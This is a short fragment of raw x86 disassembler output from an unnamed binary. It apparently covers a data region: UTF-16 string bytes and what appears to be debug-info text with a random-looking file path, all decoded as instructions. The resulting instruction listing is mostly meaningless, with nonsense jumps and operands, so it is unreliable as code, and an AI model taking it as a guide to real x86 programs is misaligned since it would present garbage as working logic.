  434874:	add    BYTE PTR [edx+0x0],dl
  434877:	push   esp
  434878:	add    BYTE PTR ds:0x52005f00,dh
  43487e:	add    BYTE PTR [edi+0x0],dl
  434881:	xor    al,BYTE PTR [eax]
  434883:	xor    al,BYTE PTR [eax]
  434885:	xor    BYTE PTR [eax],al
  434887:	xor    BYTE PTR [eax],al
  434889:	pop    edi
  43488a:	add    BYTE PTR [esi],dh
  43488c:	add    BYTE PTR [eax],al
  43488e:	add    BYTE PTR [eax+0x0],cl
  434891:	inc    ebp
  434892:	add    BYTE PTR [eax+eax*1+0x30],cl
  434896:	add    BYTE PTR [edi+0x0],bl
  434899:	dec    edx
  43489a:	add    BYTE PTR [edx],dh
  43489c:	add    BYTE PTR [edi],dh
  43489e:	add    BYTE PTR [ebp+0x0],dl
  4348a1:	add    BYTE PTR ss:[eax],dh
  4348a4:	add    BYTE PTR [eax],al
  4348a6:	add    BYTE PTR [esi+0x0],dl
  4348a9:	cmp    BYTE PTR [eax],al
  4348ab:	dec    edi
  4348ac:	add    BYTE PTR [ecx],bh
  4348ae:	add    BYTE PTR [edi+0x0],bl
  4348b1:	pop    eax
  4348b2:	add    BYTE PTR [edx+0x0],bl
  4348b5:	dec    esp
  4348b6:	add    BYTE PTR [ebx+0x0],cl
  4348b9:	add    BYTE PTR [eax],al
  4348bb:	dec    ecx
  4348bc:	add    BYTE PTR [ebp+0x0],dl
  4348bf:	dec    edi
  4348c0:	add    BYTE PTR [eax],al
  4348c2:	add    BYTE PTR [edx+0x53],dl
  4348c5:	inc    esp
  4348c6:	push   ebx
  4348c7:	jmp    0x4348be
  4348c9:	sti    
  4348ca:	adc    dl,dh
  4348cc:	jmp    0xb4fd8e01
  4348d1:	adc    eax,0xfb684dc4
  4348d6:	xchg   BYTE PTR [edx],bl
  4348d8:	add    BYTE PTR [eax],al
  4348da:	add    BYTE PTR [ebx+0x3a],dl
  4348dd:	pop    esp
  4348de:	popa   
  4348df:	jbe    0x434956
  4348e1:	jns    0x434950
  4348e3:	dec    ecx
  4348e4:	jb     0x434960
  4348e6:	pop    esp
  4348e7:	bound  di,DWORD PTR [edx+0x52]
  4348eb:	gs fs push ax
  4348ef:	arpl   WORD PTR [esi+0x5c],si
  4348f2:	js     0x43494e
  4348f4:	je     0x43493d
  4348f6:	jno    0x43493a
  4348f8:	jno    0x434961
  4348fa:	bound  ebp,QWORD PTR [esi]
  4348fc:	jo     0x434962
  4348fe:	bound  eax,QWORD PTR [eax]
	...
